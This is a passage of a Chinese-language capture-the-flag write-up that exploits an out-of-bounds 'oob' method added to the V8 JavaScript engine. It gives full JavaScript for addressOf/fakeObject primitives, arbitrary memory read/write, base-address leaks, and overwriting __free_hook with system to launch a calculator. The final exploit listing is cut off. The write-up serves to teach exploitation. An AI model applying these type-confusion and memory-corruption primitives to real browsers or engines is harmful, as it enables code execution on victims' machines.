<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>来到第一处断点，可以看到整数数组对象的 map 变量就在 elements 指向的区域后面，但是 oob 方法只能越界一个元素的位置，这里明显不够<br><img src="/images/3b546c3b/pasted-12.png" alt="starctf1"></p>
<p>继续运行，来到第二处断点，查看 arr2 即浮点数类型数组对象的内存布局，elements 区域紧接着就是 map，刚好可以修改数组对象的 map 造成类型混淆<br><img src="/images/3b546c3b/pasted-13.png" alt="starctf2"></p>
<p>我们可以用浮点数类型的数组对象来利用漏洞造成类型混淆，这里先不急，继续运行来到最后一处断点<br><img src="/images/3b546c3b/pasted-14.png" alt="starctf3"></p>
<p>可以看到，使用 <code>new</code> 的方式创建的数组，elements 位于 map 的后面，无法用于利用漏洞，其它情况的数组对象的内存布局可以多做尝试，这里就不再深究了</p>
<p>如果将一个 Float 类型的数组的 map 修改为对象数组类型，那么数组里的浮点数数值就被当成对象地址去解析，反之也可以将任意对象地址解析成浮点数，通过一定转换就可以获取对象的地址了</p>
<p>这里分别写出完成上面两个功能的函数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>
	
	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 <code>addressOf</code> 函数可以获取任意对象的地址，<code>fakeObject</code> 可以将任意地址伪造成一个 Float 类型的数组对象</p>
<p>由于 <code>addressOf</code> 是将对象的地址解析成浮点数，不太方便后续运算，这里使用一个自定义的 <code>f2i</code> 函数将其解析成整数，同理 <code>i2f</code> 函数将整数的内存表示解析成浮点数，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里可以测试一下代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> test_obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"aa"</span><span class="token operator">:</span> <span class="token string">"aaa"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addr = '</span> <span class="token operator">+</span> addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试运行，可以看到 <code>addressOf</code> 函数成功的得到了 <code>test_obj</code> 对象的地址<br><img src="/images/3b546c3b/pasted-15.png" alt="starctf4"></p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>结合 <code>addresssOf</code> 和 <code>fakeObject</code>，可以伪造一个数组对象，控制 elements 指针即可造成任意地址读写，这里画一个伪造的对象的图<br><img src="/images/3b546c3b/pasted-16.png" alt="fakeObject"></p>
<p>这个伪造的对象的数据可以存在一个 Float 数组里，通过 <code>addressOf</code> 函数，得到数据的存储地址，利用 <code>fakeObject</code> 将该地址转换成数组对象指针，通过这个伪造的数组对象即可造成任意读写，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span> <span class="token comment">//map</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//elements</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">//length</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fake_obj_addr = '</span> <span class="token operator">+</span> fake_obj_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>显示创建了一个数组 <code>fake_array</code>，用于伪造数组对象，再通过 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 获得伪造对象的地址，由于 Float 数组的 elements 指针指向的地方刚好紧挨在 <code>fake_array</code> 的 map 前面，即 <code>fake_array</code> 地址之前，数组6个元素占用 0x30 的大小，加上 elements 的 map 和 length 字段又占用 0x10 的大小，则 <code>addressOf(fake_array) - 0x40n</code> 就是 elements 指针指向的地方，那么 <code>addressOf(fake_array) - 0x40n + 0x10n;</code> 就是存储 6 个元素的起始地址</p>
<p>调试一下，可以发现 <code>fake_obj_addr</code> 计算正确<br><img src="/images/3b546c3b/pasted-17.png" alt="starctf5"><br><img src="/images/3b546c3b/pasted-18.png" alt="starctf6"></p>
<p>此时只需要通过<code>fake_array[2] = target_addr - 0x10n</code> 更改 <code>fake_obj</code> 的 elements 指针，然后使用 <code>fake_obj[0] = value</code>，即可对地址 <code>target_addr</code> 写入 <code>value</code> 值，同理可以任意读，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token function">f2i</span><span class="token punctuation">(</span>fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>	
	fake_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x10n</span> <span class="token operator">+</span> <span class="token number">0x1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_obj<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关掉地址随机化，尝试下面代码，来泄露 <code>__libc_start_main</code> 的地址</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> leak_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token number">0x555555554000n</span><span class="token operator">+</span><span class="token number">0x0000012a47b0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leak_addr = '</span> <span class="token operator">+</span> leak_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到任意读是没有问题的：<br><img src="/images/3b546c3b/pasted-20.png" alt="starctf7"><br><img src="/images/3b546c3b/pasted-21.png" alt="starctf8"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了任意读写，控制程序执行流的方式还是很多的，下面就分为传统方式和非传统方式来利用</p>
<h4 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h4><p>传统方式中，可以泄露 libc 地址，修改 <code>__free_hook</code> 为 system，或者用 one_gadget 的方式，无论哪种方式，泄露 libc 地址都是首要的任务</p>
<p>泄露的方式了解到有两种，一种是从一个 v8 对象的地址开始，内存搜索附近的内容，查看有无程序二进制空间的地址，计算得出程序及地址，之后通过基地址加偏移得到 got 表的地址，泄露 got 表项即可泄露 libc 地址，但是这种方式不太稳定，万一遇到内存不可读程序就中止了，所以这里学习另一种稳定的泄露方式</p>
<p>调试观察下面代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>查看对象 <code>a</code> 的结构<br><img src="/images/3b546c3b/pasted-22.png" alt="pwn1_1"></p>
<p>再查看其 map 类型的结构<br><img src="/images/3b546c3b/pasted-23.png" alt="pwn1_2"></p>
<p>查看 map 的 constructor 结构<br><img src="/images/3b546c3b/pasted-24.png" alt="pwn1_3"></p>
<p>在 code 的固定偏移处有程序二进制空间的地址，<br><img src="/images/3b546c3b/pasted-25.png" alt="pwn1_4"><br><img src="/images/3b546c3b/pasted-26.png" alt="pwn1_5"></p>
<p>下面代码即可泄露出程序基地址：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> code_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x30n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'code_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>code_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> v8_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>code_addr <span class="token operator">+</span> <span class="token number">0x42n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> v8_base <span class="token operator">=</span> v8_addr <span class="token operator">-</span> <span class="token number">0x94f780n</span> <span class="token operator">-</span> <span class="token number">0x679000n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'v8_base = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>v8_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后泄露 libc 地址，改 <code>__free_hook</code> 为 system 一把梭</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> free_got_addr <span class="token operator">=</span> v8_base <span class="token operator">+</span> <span class="token number">0x12aa8b8n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free_got = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>free_got_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'free = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> lbase <span class="token operator">=</span> free_addr <span class="token operator">-</span> <span class="token number">0x9d850n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1eeb28n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> system <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x55410n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这样会出现一个段错误，这是 <code>write64</code> FloatArray 对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题，参考的文章使用了 DataView 来改写任意写的方式来解决了这个问题</p>
<p>DataView 对象偏移 <code>+0x20</code> 处，存有一个 backing_store 指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写，而且不会发生 FloatArray 出现的问题，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">write64_view</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后使用 <code>write64_view</code> 代替 <code>write64</code> 即可</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%SystemBreak();</span>

<span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">write64_view</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 恢复 __free_hook 使得程序正常退出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完整 exp 如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>

	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

